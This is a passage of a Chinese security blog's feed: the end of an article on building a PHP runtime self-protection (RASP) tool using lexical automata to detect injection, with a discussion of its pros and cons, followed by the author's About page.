RASP会将这条HTTP请求判定成攻击，直接阻止执行SQL语句的函数继续运行。如果上述两个条件任一不成立，则通过安全检查，执行SQL语句的函数继续运行。这样就完成了一次HTTP请求的安全检查。其他代码注入类似，当然，不同的代码注入使用的DFA是不一样的，命令注入的DFA是基于shell语法构建的，文件包含的DFA是基于文件路径的词法构建的。</p><p>在开发过程中有几个问题需要注意，一个是\0的问题，在C语言中，\0代表一个字符串的结束，因此，在做词法分析或者其他字符串操作过程中，需要重新封装字符串，重写一些字符串的处理函数，否则攻击者可能通过\0截断字符串，绕过RASP的安全检查。</p><p>另一个问题是有限状态自动机的DoS问题。在一些非确定有限状态机中，如果这个自动机不接受某个输入，那么需要否定所有的可能性，而这个过程的复杂度可能是2^n。比较常见的例子是正则表达式DoS。在这里不做深入展开，有兴趣的朋友可以多了解一下。</p><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><p>在做完这个RASP之后，我们回头来看看，一些问题值得我们思考和讨论。</p><p>RASP有哪些优点呢？作为纵深防御中的一层，它加深了纵深防御的维度，在Web请求发生时，从HTTP Server、Web解释器/编译器到数据库，甚至是操作系统，每一层都有自己的职责，每一层也都是防护攻击的阵地，每一层也都有对应的安全产品，每一层的防护侧重点也都不同。</p><p>RASP还有一些比较明显的优点，一是对规则依赖很低，如果使用词法分析做安全检测的话基本不需要维护规则。二是减少了HTTP Server这层攻击面，绕过比较困难，绝大多数基于HTTP Server特性的绕过对RASP无效。例如HPP、HPF、畸形HTTP请求、各种编码、拆分关键字降低评分等。三是误报率比较低。从比较理想的角度来说，如果我的后端代码写得非常安全，WAF看到一个包含攻击payload的请求就拦截，这也属于误报吧。</p><p>RASP的缺点也很明显，一是部署问题，需要在每个服务器上部署。二是无法像云WAF这样，可以通过机器学习进化检验规则。三是对服务器性能有影响，但是影响不大。根据我们对PHP RASP做的性能测试结果来看，一般来说，处理一个HTTP请求所消耗的性能中，PHP RASP消耗的占3%左右。</p><p>其实，跳出RASP，动态污点跟踪和hook这套技术方案在能做的事情很多，比如性能监控、自动化Fuzz、入侵检测系统、Webshell识别等等。如果各位有什么想法，欢迎和我们交流。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>鸟哥taint <a href="https://github.com/laruence/taint" target="_blank" rel="noopener">https://github.com/laruence/taint</a></li><li>Thinking In PHP Internals</li><li><a href="http://php.net" target="_blank" rel="noopener">http://php.net</a></li><li>PHP Complier Internals</li><li>自动机理论、语言和计算导论</li></ul><h2 id="关于作者"><a href="#关于作者" class="headerlink" title="关于作者"></a>关于作者</h2><p>两位作者水平有限，如文章有错误疏漏，或者有任何想讨论交流的，请随时联系</p><ul><li>c0d3p1ut0s <code>c0d3p1ut0s@gmail.com</code></li><li>s1m0n <code>simonfoxcat@gmail.com</code></li></ul><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>在PHP RASP中，我们使用了一部分taint和PHP内核的代码。两者的License都是PHP License。因此，在软件发行过程中，我们将遵守PHP License的相关限制。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这篇文章2017.11.10发在 &lt;a href=&quot;https://paper.seebug.org/449/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://paper.seebug.org/449/&lt;/a&gt; 。重发在博客如下&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;RASP概念&quot;&gt;&lt;a href=&quot;#RASP概念&quot; class=&quot;headerlink&quot; title=&quot;RASP概念&quot;&gt;&lt;/a&gt;RASP概念&lt;/h2&gt;&lt;p&gt;RASP（Runtime Application self-protection）是一种在运行时检测攻击并且进行自我保护的一种技术。早在2012年，Gartner就开始关注RASP，惠普、WhiteHat Security等多家国外安全公司陆续推出RASP产品，时至今日，惠普企业的软件部门出售给了Micro Focus，RASP产品Application Defender随之易主。而在国内，去年知道创宇KCon大会兵器谱展示了JavaRASP，前一段时间，百度开源了OpenRASP，去年年底，360的0kee团队开始测试Skywolf，虽然没有看到源码和文档，但它的设计思路或许跟RASP类似。而商业化的RASP产品有OneAPM的OneRASP和青藤云的自适应安全产品。在国内，这两家做商业化RASP产品做得比较早。&lt;/p&gt;
&lt;p&gt;那么RASP到底是什么呢？它到底是怎样工作的呢？&lt;br&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://c0d3p1ut0s.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="RASP" scheme="http://c0d3p1ut0s.github.io/tags/RASP/"/>
    
      <category term="PHP" scheme="http://c0d3p1ut0s.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>About</title>
    <link href="http://c0d3p1ut0s.github.io/about/"/>
    <id>http://c0d3p1ut0s.github.io/about/</id>
    <published>2017-11-27T15:35:47.000Z</published>
    <updated>2018-07-11T14:17:49.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="关于本人"><a href="#关于本人" class="headerlink" title="关于本人"></a>关于本人</h4><ul><li>开发者 做一些安全</li></ul><h4 id="一些微小的工作"><a href="#一些微小的工作" class="headerlink" title="一些微小的工作"></a>一些微小的工作</h4><ul><li>一类PHP RASP实现 <a href="https://paper.seebug.org/449/" target="_blank" rel="noopener">https://paper.seebug.org/449/</a></li><li>Java RASP浅析——以百度OpenRASP为例 <a href="https://paper.seebug.org/513/" target="_blank" rel="noopener">https://paper.seebug.org/513/</a></li></ul><hr><ul><li><a href="https://github.com/c0d3p1ut0s/java-stack-trace" target="_blank" rel="noopener">java-stack-trace</a>：java-stack-trace是一个用于调试的java instrument，指定方法前缀，它能在指定前缀的方法被调用时打印当前堆栈。</li><li><a href="https://github.com/c0d3p1ut0s/ip-convert" target="_blank" rel="noopener">ip-convert</a>：工作中用到的，各种ip格式解析和ip集合的交并补操作。</li></ul><h4 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h4><ul><li>Email: <code>YzBkM3AxdXQwc0BnbWFpbC5jb20=</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;关于本人&quot;&gt;&lt;a href=&quot;#关于本人&quot; class=&quot;headerlink&quot; title=&quot;关于本人&quot;&gt;&lt;/a&gt;关于本人&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;开发者 做一些安全&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;一些微小的工作&quot;&gt;&lt;a href=&quot;#一些微小的工作&quot;
      
    
    </summary>
    
    
      <category term="aboutme" scheme="http://c0d3p1ut0s.github.io/tags/aboutme/"/>
    
  </entry>
  
</feed>
